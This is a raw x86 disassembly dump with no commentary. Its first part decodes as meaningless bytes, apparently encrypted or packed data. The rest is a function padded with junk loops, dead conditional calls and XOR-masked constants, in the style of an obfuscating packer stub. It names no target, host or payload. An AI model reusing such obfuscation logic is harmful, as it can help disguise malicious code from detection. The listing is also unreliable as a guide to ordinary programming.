  414b71:	adc    al,dl
  414b73:	(bad)  
  414b75:	xor    bl,BYTE PTR [esi+0x6d86afa6]
  414b7b:	les    edx,FWORD PTR [edx-0x1]
  414b7e:	out    dx,eax
  414b7f:	mov    bl,0x4c
  414b81:	sbb    ebp,DWORD PTR es:[edi]
  414b84:	mov    eax,0x24f8d21d
  414b89:	and    BYTE PTR [ebp+0x421f7867],0xec
  414b90:	pop    eax
  414b91:	add    DWORD PTR [ebx+0x2003fe8f],ecx
  414b97:	xor    edx,eax
  414b99:	add    edx,ecx
  414b9b:	imul   edx,ebx
  414b9e:	cmp    edx,edi
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	imul   edi,DWORD PTR [ebp+0x12805f9a],0x7ee5787f
  414bbb:	js     0x414c35
  414bbd:	repnz test DWORD PTR [eax],esp
  414bc0:	push   cs
  414bc1:	push   cs
  414bc2:	xchg   DWORD PTR [esi-0x23],eax
  414bc5:	(bad)  
  414bc6:	fstp   TBYTE PTR [ebp-0x24b14f3]
  414bcc:	into   
  414bcd:	cmp    edx,edx
  414bcf:	popa   
  414bd0:	mov    ds:0x8c640269,al
  414bd5:	sub    DWORD PTR [esi+edi*1+0x59],esi
  414bd9:	inc    edi
  414bda:	jo     0x414c33
  414bdc:	int    0xbc
  414bde:	jmp    0x960fd8b9
  414be3:	loope  0x414c2c
  414be5:	test   al,0xa4
  414be7:	arpl   WORD PTR [ebx-0x4f],di
  414bea:	mov    edx,0xe3f0df0
  414bef:	mov    esp,0x602c557b
  414bf4:	test   BYTE PTR [eax+ebx*4-0x5bc050d6],0x78
  414bfc:	(bad)  
  414bfd:	sbb    eax,0x3e2adbe3
  414c02:	(bad)  
  414c03:	jae    0x414c15
  414c05:	xor    eax,0xedffcc4b
  414c0a:	mov    ds:0x8eca9f0b,al
  414c0f:	sbb    eax,0xd7b89b83
  414c14:	pop    es
  414c15:	cmp    esp,edx
  414c17:	fistp  DWORD PTR [ecx+0x2ce0f6fe]
  414c1d:	dec    ebp
  414c1e:	xchg   ecx,eax
  414c1f:	mov    DWORD PTR ds:0x49b5e80f,0x32de44a4
  414c29:	pushf  
  414c2a:	and    DWORD PTR [ecx+edx*1+0x68],edi
  414c2e:	sbb    BYTE PTR [eax],bl
  414c30:	in     al,0x40
  414c32:	jbe    0x414c61
  414c34:	jo     0x414c90
  414c36:	iret   
  414c37:	mov    dl,0xa3
  414c39:	jmp    0x200e9b41
  414c3e:	loop   0x414c63
  414c40:	shl    DWORD PTR [edx-0x609c543e],1
  414c46:	xchg   BYTE PTR [eax-0x37],ah
  414c49:	stos   DWORD PTR es:[edi],eax
  414c4a:	test   eax,0x82889506
  414c4f:	or     bl,BYTE PTR [ecx+0x3b71b656]
  414c55:	dec    esi
  414c56:	je     0x414c81
  414c58:	push   ecx
  414c59:	leave  
  414c5a:	inc    esi
  414c5b:	sti    
  414c5c:	pop    esi
  414c5d:	push   0x1e1e4c75
  414c62:	cwde   
  414c63:	jl     0x414bfd
  414c65:	in     al,0x69
  414c67:	fdivr  QWORD PTR [ebx]
  414c69:	lods   eax,DWORD PTR ds:[esi]
  414c6a:	mov    esp,DWORD PTR [ebx+0x57]
  414c6d:	inc    edx
  414c6e:	sub    BYTE PTR [eax+ecx*8-0x643653a6],ch
  414c75:	xor    BYTE PTR [eax-0x205aa0cc],dh
  414c7b:	out    dx,eax
  414c7c:	jmp    0xe1606ad0
  414c81:	mov    ch,0x74
  414c83:	and    ecx,DWORD PTR ds:0x97911312
  414c89:	mov    fs,eax
  414c8b:	call   0xc0f4:0x371a8cea
  414c92:	dec    esp
  414c93:	mov    ebp,0x607f2c6b
  414c98:	jmp    0x2ee08bc1
  414c9d:	sar    DWORD PTR [eax-0x4a32544f],1
  414ca3:	in     eax,dx
  414ca4:	cmp    al,0x74
  414ca7:	pause  
  414ca9:	fcomp  QWORD PTR [edx+0x4b]
  414cac:	mov    esp,0x207fae84
  414cb1:	loopne 0x414ca1
  414cb3:	mov    edx,0x3b52f536
  414cb8:	aaa    
  414cb9:	loope  0x414cff
  414cbb:	mov    cl,0xc6
  414cbd:	cdq    
  414cbe:	loopne 0x414c7a
  414cc0:	push   ss
  414cc1:	out    dx,al
  414cc2:	mov    WORD PTR [edi-0x30d64cdb],?
  414cc8:	push   ebx
  414cc9:	aaa    
  414cca:	cwde   
  414ccb:	stos   BYTE PTR es:[edi],al
  414ccc:	sbb    eax,DWORD PTR [eax-0x3e9e5dc]
  414cd2:	(bad)  
  414cd3:	pop    eax
  414cd4:	gs das 
  414cd6:	in     eax,dx
  414cd7:	inc    edx
  414cd8:	mov    esi,0xd07e0f6e
  414cdd:	xchg   esp,eax
  414cde:	ds aam 0x36
  414ce1:	and    bh,BYTE PTR [edx]
  414ce3:	es jle 0x414cb9
  414ce6:	retf   
  414ce7:	ds clc 
  414ce9:	sti    
  414cea:	lds    ebp,FWORD PTR [ebx-0x17]
  414ced:	push   esi
  414cee:	mov    fs,WORD PTR [ecx+0x790bd89b]
  414cf4:	test   BYTE PTR [ebx-0x7442917c],dh
  414cfa:	pop    eax
  414cfb:	jne    0x414ce5
  414cfd:	retf   
  414cfe:	imul   eax,ebp,0xffffff9d
  414d01:	es sahf 
  414d03:	je     0x414c95
  414d05:	pop    ecx
  414d06:	or     esi,DWORD PTR [esi]
  414d08:	jbe    0x414d2f
  414d0a:	(bad)  
  414d0b:	sbb    ch,dl
  414d0d:	mov    dh,BYTE PTR [ebp+0x6c]
  414d10:	imul   esp,eax,0xffffffac
  414d13:	aam    0x37
  414d15:	cli    
  414d16:	lahf   
  414d17:	mov    bh,0xfc
  414d19:	ja     0x414d7e
  414d1b:	mov    dl,0xf3
  414d1d:	aad    0xa5
  414d1f:	out    dx,al
  414d20:	test   eax,0x8396fc76
  414d25:	sub    BYTE PTR [ecx-0x6c84f353],ah
  414d2b:	aas    
  414d2c:	sub    al,0x37
  414d2e:	sub    bl,ah
  414d30:	fild   WORD PTR [edi]
  414d32:	jne    0x414d7b
  414d34:	ins    DWORD PTR es:[edi],dx
  414d35:	in     eax,dx
  414d36:	shl    BYTE PTR [ebx-0x65],1
  414d39:	test   al,0xa0
  414d3b:	jecxz  0x414cd0
  414d3d:	xor    al,bl
  414d3f:	fs addr16 pop esp
  414d42:	add    ebp,DWORD PTR [edi+0x63aa84be]
  414d48:	jmp    0xd2d02538
  414d4d:	jns    0x414cde
  414d4f:	sub    DWORD PTR [edx+esi*4],eax
  414d52:	xchg   ebp,eax
  414d54:	adc    bh,BYTE PTR [ebx+0x77677b10]
  414d5a:	fstp   DWORD PTR [edx-0x31]
  414d5d:	hlt    
  414d5e:	mov    eax,ds:0xdc918487
  414d63:	push   ebp
  414d64:	in     eax,dx
  414d65:	or     esp,0xb
  414d68:	push   cs
  414d69:	jmp    0xdf639ae8
  414d6e:	ja     0x414d34
  414d70:	lea    esp,[edi+0x38b5fb0f]
  414d76:	fstp   DWORD PTR [esi+0x23eca9b3]
  414d7c:	or     DWORD PTR [ebx+0x66],ebp
  414d7f:	or     eax,0x7486aacb
  414d84:	add    al,0x15
  414d86:	call   0x355d1359
  414d8b:	sub    cl,BYTE PTR ss:0xd6733686
  414d92:	stos   DWORD PTR es:[edi],eax
  414d93:	out    0x54,al
  414d95:	imul   eax,DWORD PTR [ebx+0x59],0xffffff82
  414d99:	popf   
  414d9a:	cdq    
  414d9b:	retf   0x1a0d
  414d9e:	scas   al,BYTE PTR es:[edi]
  414d9f:	cmp    ah,bh
  414da1:	jmp    0x414d9c
  414da3:	test   al,0x8f
  414da5:	test   eax,0xb7b5da80
  414daa:	(bad)  
  414dab:	hlt    
  414dac:	jp     0x414d9e
  414dae:	sbb    eax,0xa0319a79
  414db3:	scas   eax,DWORD PTR es:[edi]
  414db4:	xchg   DWORD PTR [ebx+edi*2],ecx
  414db7:	sti    
  414db8:	mov    al,ds:0x346495d
  414dbd:	jnp    0x414e06
  414dbf:	mov    eax,ss
  414dc1:	ds and al,0xda
  414dc4:	push   edi
  414dc5:	jnp    0x414da9
  414dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dc8:	mov    eax,0x7e6baa5e
  414dcd:	mov    ah,0x4c
  414dcf:	rcr    DWORD PTR [edi+esi*4-0x5dbab60d],1
  414dd6:	sub    ch,BYTE PTR ds:0x93984494
  414ddc:	and    al,0x8d
  414dde:	dec    ebx
  414ddf:	cmp    DWORD PTR [esi-0x2aa7a796],ecx
  414de5:	daa    
  414de6:	retf   
  414de7:	inc    ebp
  414de8:	adc    al,0xd8
  414dea:	shr    DWORD PTR [edi-0x4c],cl
  414ded:	mov    al,0x13
  414def:	mov    ds:0xb8df871c,al
  414df4:	fwait
  414df5:	and    dh,BYTE PTR [ebx+0x48c1ed5]
  414dfb:	cmp    esp,DWORD PTR [ebp-0x43b91b76]
  414e01:	cmc    
  414e02:	sbb    ah,BYTE PTR [esi]
  414e04:	cli    
  414e05:	cld    
  414e06:	out    0x5f,al
  414e08:	mov    dl,BYTE PTR ds:0x86302a67
  414e0e:	jl     0x414e45
  414e10:	xchg   edi,eax
  414e11:	push   ecx
  414e12:	dec    ebp
  414e13:	aam    0x91
  414e15:	(bad)  
  414e16:	clc    
  414e17:	cwde   
  414e18:	add    DWORD PTR [ecx-0x56],ecx
  414e1b:	or     eax,ebp
  414e1d:	ret    
  414e1e:	cmp    eax,DWORD PTR [eax+0x14976524]
  414e24:	and    cl,BYTE PTR fs:[ecx+0x66860fbf]
  414e2b:	lods   al,BYTE PTR ds:[esi]
  414e2c:	(bad)  
  414e2d:	call   FWORD PTR [ebx+0x5f]
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42a7f5
  414e44:	xor    DWORD PTR ds:0x42a771,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42a7b9,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42a841,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42a841
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42a841,eax
  414e70:	cmp    DWORD PTR ds:0x42a841,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42a841,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42a84d
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42a801
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42a7f9,0x42a831
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42a801,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42a835,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42a775
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42a845,0x42a765
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42a7b1,0x42a841
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42a801,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42a769,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42a7fd,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42a7fd
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42a7fd,edi
  414f60:	cmp    DWORD PTR ds:0x42a7fd,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42a7fd,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42a809
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42a7fd,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42a7fd
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42a7fd,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42a7b5,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42a7c9,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42a76d
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42a845,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42a849,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42a7b9
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42a805,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42a845,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42a849,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42a849
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42a849,ecx
  415032:	cmp    DWORD PTR ds:0x42a849,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42a849,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42a871
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42a7f1,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42a885,0x42a7b5
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42a7c1,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42a7c5,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42a879,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42a879
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42a879,ecx
  4150bb:	cmp    DWORD PTR ds:0x42a879,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42a879,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42a83d
  4150e5:	xor    ecx,DWORD PTR ds:0x42a84d
  4150eb:	mov    DWORD PTR ds:0x42a83d,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42a7b1,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42a7f1
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42a875,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42a875
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42a875,ecx
  415120:	cmp    DWORD PTR ds:0x42a875,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42a875,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42a75d,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42a75d
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42a75d,ecx
  41515e:	cmp    DWORD PTR ds:0x42a75d,0xe
  415165:	jne    0x415176
  41516b:	push   0x42a99f
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42a75d,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42a75d
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42a75d,ecx
  415190:	cmp    DWORD PTR ds:0x42a75d,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42a781
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42a7c1,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42a7c1
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42a7c1,ecx
  4151c1:	cmp    DWORD PTR ds:0x42a7c1,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42a7c1,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42a7c1,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42a7c1
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42a7c1,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42a7c9,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42a7c9
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42a7c9,ecx
  415230:	cmp    DWORD PTR ds:0x42a7c9,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42a7c9,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42a775
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42a7c9,0x42a881
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42a871,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42a841,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42a839,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42a765,0x42a87d
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42a83d,0x42a759
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42a7cd,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42a7cd
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42a7cd,ecx
  4152f0:	cmp    DWORD PTR ds:0x42a7cd,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42a7cd,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42a849
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42a781,0x10
  415329:	cmp    DWORD PTR ds:0x42a781,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42a781,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42a781,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42a781
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42a781,edx
  41536d:	mov    edx,DWORD PTR ds:0x42a781
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42a781,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42a7f1,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42a7f1
  415393:	inc    eax
  415394:	mov    ds:0x42a7f1,eax
  415399:	cmp    DWORD PTR ds:0x42a7f1,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42a7f1,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42a759
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42a7bd,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42a831,0x0
  4153ed:	mov    eax,ds:0x42a831
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42a831,eax
  4153f8:	cmp    DWORD PTR ds:0x42a831,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42a932
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42a831,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42a831
  41542b:	inc    eax
  41542c:	mov    ds:0x42a831,eax
  415431:	cmp    DWORD PTR ds:0x42a831,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42a761,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42a88d,0x1d
  41545d:	cmp    DWORD PTR ds:0x42a88d,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42a88d,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42a769
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42a88d,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42a88d
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42a88d,edx
  4154af:	mov    edx,DWORD PTR ds:0x42a88d
  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42a88d,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42a7b9
  4154c7:	and    edx,DWORD PTR ds:0x42a84d
  4154cd:	mov    DWORD PTR ds:0x42a7b9,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42a781,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
  4154e3:	add    DWORD PTR ds:0x42a835,0x42a7f1
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42a835,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42a7c5,0x42a805
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42a7f5,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42a761,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42a7bd,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42a7bd
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42a7bd,ecx
  415552:	cmp    DWORD PTR ds:0x42a7bd,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42a845
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42a7bd,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42a87d,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42a87d
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42a87d,ecx
  4155a7:	cmp    DWORD PTR ds:0x42a87d,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42a87d,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
